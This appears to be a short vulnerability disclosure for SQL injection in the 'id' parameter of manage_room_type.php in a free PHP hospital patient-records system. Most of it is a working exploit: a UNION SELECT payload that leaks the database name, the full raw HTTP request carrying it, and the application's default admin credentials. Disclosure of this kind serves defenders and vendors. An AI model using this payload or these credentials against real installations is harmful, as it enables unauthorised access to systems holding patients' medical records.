# Hospital's Patient Records Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html

Vulnerability File: /hprms/admin/room_types/manage_room_type.php?id=

Vulnerability location: /hprms/admin/room_types/manage_room_type.php?id=, id

Current database name: hprms_db ,length is 8

[+] Payload: /hprms/admin/room_types/manage_room_type.php?id=-2%27%20union%20select%201,database(),3,4,5,6--+ // Leak place ---> id

```sql
GET /hprms/admin/room_types/manage_room_type.php?id=-2%27%20union%20select%201,database(),3,4,5,6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/171822894-2faa515f-b4e8-49e9-91b5-9cac1ddddee8.png)

![image](https://user-images.githubusercontent.com/54017627/171822921-80317e91-19b2-4bb4-8f09-afa505b1c542.png)
